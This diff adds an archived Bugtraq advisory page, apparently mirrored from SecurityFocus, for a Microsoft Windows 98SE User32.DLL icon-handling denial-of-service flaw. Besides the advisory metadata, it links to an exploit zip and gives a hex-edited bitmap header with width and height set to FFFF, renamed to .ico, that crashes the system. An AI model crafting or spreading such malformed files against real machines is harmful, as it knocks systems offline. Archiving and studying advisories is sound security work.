@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid13791<p><b><span style="font-size: 18pt;">Microsoft Windows User32.DLL Icon Handling Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13791/info">info</a><br><a href="http://www.securityfocus.com/bid/13791/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13791/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13791/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13791/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13791
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 27 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 27 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to "- k -" &lt;klistas@gmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft Windows 98SE  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x14000/13791/exploit_icon.zip">#exploit_exploit_icon.zip</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required. The following example is available:<br/><br/>Just open a bitmap in a hex editor and modify the width and height data:<br/><br/>Locate the "XXXX" values...<br/><br/>----------------------------------------------------------------------------<br/>00000000  :  424D 38F9 1500 0000 0000 3600 0000 2800 0000 XXXX<br/>00000010  :  0000 XXXX 0000 0100 1800 0000 0000 02F9 1500 120B<br/>----------------------------------------------------------------------------<br/><br/>...and change to:<br/><br/>----------------------------------------------------------------------------<br/>00000000  :  424D 38F9 1500 0000 0000 3600 0000 2800 0000 FFFF<br/>00000010  :  0000 FFFF 0000 0100 1800 0000 0000 02F9 1500 120B<br/>----------------------------------------------------------------------------<br/><br/>Then change the extention to ".ico". Notice that the system will crash.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/exploit_icon.zip">/data/vulnerabilities/exploits/exploit_icon.zip</a></li>
+</ul>
+</div>
